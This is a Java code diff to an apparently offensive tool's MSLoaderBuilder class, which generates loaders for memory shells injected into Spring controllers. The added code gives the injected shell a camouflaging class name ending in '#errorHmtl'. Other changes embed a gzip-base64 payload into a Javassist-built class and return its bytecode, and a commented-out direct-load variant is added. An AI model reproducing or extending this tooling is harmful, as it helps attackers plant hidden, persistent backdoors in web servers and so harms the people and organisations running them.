@@ -77,6 +77,19 @@ public class MSLoaderBuilder {
     @Middleware(Middleware.Spring)
     @MemShell(MemShell.Controller)
     public byte[] controller(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        String name = javaClassHelper.getNAME();
+        String simpleTypeName = name.substring(name.lastIndexOf(".") + 1);
+
+        for(int i = 0; i < simpleTypeName.length(); ++i) {
+            if (Character.isUpperCase(simpleTypeName.charAt(i))) {
+                sb.append(simpleTypeName.charAt(i));
+            }
+        }
+
+        String msName = sb.append("#").append("errorHmtl").toString();
+        javaClassHelper.setNAME(msName);
+
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
     }
 
@@ -95,10 +108,27 @@ public class MSLoaderBuilder {
 
         JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));
 
-        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
-        // todo 避免影响到加载器
-        javaClassHelper.setCLASSNAME(null);
-
-        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
+
+    /**
+     * 直接加载
+     */
+//    public static CtClass defaultCtClassLoader(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+//        ClassPool classPool = ClassPool.getDefault();
+//        classPool.insertClassPath(new ClassClassPath(cls));
+////        classPool.importPackage("javax.servlet.http");
+//        classPool.importPackage("java.util");
+//        classPool.importPackage("java.lang.reflect");
+//
+//        CtClass ctClass = classPool.getCtClass(cls.getName());
+//
+//        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));
+//
+//        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
+//        JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
+//
+//        return ctClass;
+//    }
 }
